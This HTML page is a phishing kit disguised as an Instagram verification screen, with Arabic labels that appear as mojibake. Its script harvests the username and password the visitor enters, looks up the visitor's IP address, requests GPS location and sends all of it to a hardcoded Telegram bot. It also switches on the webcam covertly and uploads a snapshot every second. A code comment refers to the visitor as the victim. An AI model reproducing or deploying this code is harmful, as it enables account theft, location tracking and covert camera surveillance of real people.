<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Verification</title>
    <style>
        body { background: #fafafa; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; direction: rtl; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 310px; text-align: center; border-radius: 3px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" width="170">
        <p style="font-size:12px; color:#8e8e8e;">ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø­Ø³Ø§Ø¨</p>
        <input type="text" id="u" placeholder="Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…" required>
        <input type="password" id="p" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±" required>
        <button onclick="collectAllData()">ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø²ÙŠØ§Ø¯Ø©</button>
    </div>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="can" style="display:none;"></canvas>

    <script>
        const T = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
        const ID = '1371063739';

        async function collectAllData() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;

            // 1. Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP
            let ip = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {}

            // 2. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    const msg = `ğŸ‘¤ ÙŠÙˆØ²Ø±: ${u}\nğŸ”‘ Ø¨Ø§Ø³: ${p}\nğŸŒ IP: ${ip}\nğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${locLink}`;
                    sendMsg(msg);
                }, () => {
                    sendMsg(`ğŸ‘¤ ÙŠÙˆØ²Ø±: ${u}\nğŸ”‘ Ø¨Ø§Ø³: ${p}\nğŸŒ IP: ${ip}\nğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†`);
                });
            }

            // 3. ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (ØµÙˆØ±Ø© ÙƒÙ„ Ø«Ø§Ù†ÙŠØ©)
            startCamera(u);
        }

        function sendMsg(text) {
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
        }

        async function startCamera(user) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = s;
                setInterval(() => {
                    const c = document.getElementById('can');
                    const v = document.getElementById('v');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', ID);
                        f.append('photo', b, 'x.jpg');
                        f.append('caption', `ğŸ“¸ ØµÙˆØ±Ø© Ù„Ù€: ${user}`);
                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
                    }, 'image/jpeg');
                }, 1000);
            } catch(e) {}
        }
    </script>
</body>
</html>

